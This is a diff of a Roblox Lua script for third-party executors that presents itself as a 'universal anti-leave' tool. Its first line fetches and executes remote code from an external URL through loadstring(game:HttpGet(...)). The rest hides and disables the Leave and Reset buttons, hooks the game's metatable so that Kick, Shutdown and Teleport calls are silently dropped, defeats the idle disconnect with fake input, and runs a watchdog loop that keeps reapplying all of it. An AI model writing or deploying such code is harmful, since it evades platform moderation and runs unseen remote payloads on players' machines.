@@ -1,1 +1,141 @@
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjY3NWRkMGFlLTlmOTMtNDU2MS1hYTNjLTY3YTRkMmZlN2Y5YiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJhbWVhbmV3dWltYWluIn19"))()
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjM5MDgyZjc3LWNhOWMtNGU4My1hODRhLTU0MmNjOWQ5NjJmYSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJhbWVhbmV3dWltYWluIn19"))()
+--=====================================================================
+--  UNIVERSAL ANTI-LEAVE  --  PC + Mobile, every executor
+--  Runs on the client that executes it. Degrades gracefully:
+--  every executor-only call is wrapped, so a weak executor still
+--  gets the property-lock method, which needs nothing special.
+--=====================================================================
+
+local CoreGui     = game:GetService("CoreGui")
+local Players     = game:GetService("Players")
+local VirtualUser = game:GetService("VirtualUser")
+
+local LP = Players.LocalPlayer
+
+local BLOCK_RESET = true   -- also kill the Reset Character button
+
+--------------------------------------------------------------------
+-- Every exit control, PC + mobile, under any CoreGui layout
+--------------------------------------------------------------------
+local TARGETS = {
+    LeaveGameButton = true,   -- PC + mobile settings menu
+    LeaveButton     = true,   -- alt layout / in-experience menu
+    RespawnButton   = BLOCK_RESET or nil,
+    ResetButton     = BLOCK_RESET or nil,
+}
+
+--------------------------------------------------------------------
+-- Kill one button, every way that exists
+--------------------------------------------------------------------
+local locked = setmetatable({}, { __mode = "k" })
+
+-- Some executors expose getconnections but hand back connection objects with
+-- no :Disable(). Fall back to :Disconnect(), and pcall per connection so one
+-- unsupported signal can't abort the rest of the sweep for this button.
+local HAS_GETCONNECTIONS = (type(getconnections) == "function")
+
+local function severSignal(sig)
+    local ok, conns = pcall(getconnections, sig)
+    if not ok or type(conns) ~= "table" then return end
+    for _, c in ipairs(conns) do
+        if not pcall(function() c:Disable() end) then
+            pcall(function() c:Disconnect() end)
+        end
+    end
+end
+
+local function killButton(btn)
+    -- 1. sever the CoreScript's own handlers (best method, executor-only)
+    if HAS_GETCONNECTIONS then
+        severSignal(btn.Activated)
+        severSignal(btn.MouseButton1Click)
+        severSignal(btn.MouseButton1Down)
+        severSignal(btn.InputBegan)
+        severSignal(btn.TouchTap)          -- mobile
+    end
+
+    -- 2. make it inert (plain Roblox API -- works on literally anything)
+    pcall(function()
+        btn.Active          = false
+        btn.AutoButtonColor = false
+        btn.Selectable      = false
+        btn.Visible         = false
+    end)
+
+    -- 3. lock it: if a CoreScript flips it back, flip it straight back off.
+    --    This is what makes it self-healing without relying on the poll.
+    if not locked[btn] then
+        locked[btn] = true
+        pcall(function()
+            btn:GetPropertyChangedSignal("Visible"):Connect(function()
+                if btn.Visible then btn.Visible = false end
+            end)
+            btn:GetPropertyChangedSignal("Active"):Connect(function()
+                if btn.Active then btn.Active = false end
+            end)
+        end)
+    end
+end
+
+--------------------------------------------------------------------
+-- Sweep every exit button currently in CoreGui
+--------------------------------------------------------------------
+local function sweep()
+    for _, obj in ipairs(CoreGui:GetDescendants()) do
+        if TARGETS[obj.Name] and obj:IsA("GuiButton") then
+            killButton(obj)
+        end
+    end
+end
+
+--------------------------------------------------------------------
+-- Catch buttons the instant the menu builds them
+--------------------------------------------------------------------
+pcall(function()
+    CoreGui.DescendantAdded:Connect(function(obj)
+        if TARGETS[obj.Name] then
+            task.defer(function()
+                if obj:IsA("GuiButton") then killButton(obj) end
+            end)
+        end
+    end)
+end)
+
+--------------------------------------------------------------------
+-- Block the API-level exits: Kick, Shutdown, Teleport
+--------------------------------------------------------------------
+pcall(function()
+    local mt = getrawmetatable(game)
+    setreadonly(mt, false)
+    local oldNamecall = mt.__namecall
+    mt.__namecall = newcclosure(function(self, ...)
+        local m = getnamecallmethod() or ""
+        if m == "Kick" or m == "Shutdown" or m:sub(1, 8) == "Teleport" then
+            return nil
+        end
+        return oldNamecall(self, ...)
+    end)
+    setreadonly(mt, true)
+end)
+
+--------------------------------------------------------------------
+-- Anti-AFK: stops the 20-minute idle disconnect
+--------------------------------------------------------------------
+pcall(function()
+    LP.Idled:Connect(function()
+        VirtualUser:CaptureController()
+        VirtualUser:ClickButton2(Vector2.new())
+    end)
+end)
+
+--------------------------------------------------------------------
+-- Watchdog: sweep forever, and survive any error in a single pass
+--------------------------------------------------------------------
+task.spawn(function()
+    while true do
+        pcall(sweep)
+        task.wait(0.25)
+    end
+end)
+
+sweep()
